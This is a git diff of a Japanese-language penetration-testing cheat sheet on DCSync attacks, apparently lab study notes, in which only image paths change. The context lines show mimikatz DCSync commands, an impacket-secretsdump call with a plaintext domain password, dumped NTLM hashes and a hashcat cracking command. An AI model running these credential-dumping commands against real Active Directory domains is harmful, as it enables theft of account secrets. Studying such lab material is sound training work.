@@ -30,7 +30,7 @@ lsadump::dcsync /user:corp\dave
 ```
 - ターゲットはdave
 - krbtgtならdaveの部分を変更して実行
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090939.png)
+![](../../../assets/images/Pasted%20image%2020260502090939.png)
 NTLM Hash
 ```
 08d7a47a6f9f66b97b1bae4178747494
@@ -51,7 +51,7 @@ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/has
 ```zsh
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.158.70
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090947.png)
+![](../../../assets/images/Pasted%20image%2020260502090947.png)
 
 ---
 # Exmple
@@ -59,7 +59,7 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 #mimikatz
 lsadump::dcsync /user:corp\jeffadmin
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502091329.png)
+![](../../../assets/images/Pasted%20image%2020260502091329.png)
 ```
 e460605a9dbd55097c6cf77af2f89a03
 ```
